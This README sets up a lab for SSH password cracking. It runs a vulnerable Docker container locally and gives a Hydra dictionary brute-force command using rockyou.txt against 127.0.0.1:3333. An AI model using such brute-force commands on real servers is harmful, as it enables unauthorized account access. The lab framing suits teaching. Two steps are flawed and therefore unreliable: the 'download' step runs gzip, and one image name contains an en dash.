### Attack is the best defense


## Dictionary attack

# Security Testing Setup README

This README provides instructions for setting up Docker and Hydra for security testing purposes. Please ensure that you use these tools responsibly and ethically, adhering to applicable laws and regulations.

### Step 1: Install Docker

```bash
sudo apt install docker.io
```
### Step 2: Install Hydra

```bash
sudo  apt install hydra
```
### Step 3: Run Docker Container
```bash
# Replace 'sylvainkalache/264-1' with the desired Docker image
docker run -p 2222:22 -d -ti sylvainkalache/264–1
```
### Step 4: Download rockyou.txt
```bash
# Navigate to the directory containing 'rockyou.txt'
gzip rockyou.txt
```
### Step 5: Run Another Docker Container
```bash
# Replace 'sylvainkalache/264-1' with the desired Docker image
sudo docker run -p 3333:22 -d -ti sylvainkalache/264-1
```
### Step 6: Use Hydra for Brute-Force Attack
```bash
# Replace 'rockyou.txt' with the appropriate wordlist
# Replace 'sylvain' with the target username
# Replace '127.0.0.1:3333' with the target SSH server address and port
# Adjust the '-t' option for the desired number of parallel threads
sudo hydra -l sylvain -P rockyou.txt ssh://127.0.0.1:3333 -t 4
```

![alt text](image-4.png)

## Note: Ensure ethical and legal use of security testing tools. Unauthorized access attempts are illegal and may have severe consequences.




